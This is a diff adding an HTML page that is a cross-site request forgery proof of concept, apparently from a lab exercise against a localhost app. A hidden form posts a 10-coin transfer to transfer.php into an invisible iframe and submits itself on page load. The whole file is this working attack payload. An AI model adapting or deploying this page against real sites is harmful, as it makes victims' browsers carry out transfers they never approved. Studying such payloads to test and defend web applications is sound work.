@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <iframe name="hiddenFrame" class="hide" style="display:none;"></iframe>
+    <form method=POST name="derp" action="http://localhost/transfer.php" target="hiddenFrame" onsubmit="document.location='http://google.com';">
+      <input type="hidden" name=coins  value="10" >
+      <input type="hidden" name=recipient value="you">
+      <input type="hidden" name=submission value="Send">
+    </form>
+    <script>
+      window.onload = function(){
+        document.forms["derp"].submit()
+      }
+      //document.getElementById("derp").submit();
+      //document.location="http://google.com";
+      //document.location="http://yesiamparanoid.com";
+    </script>
+  </body>
+</html>
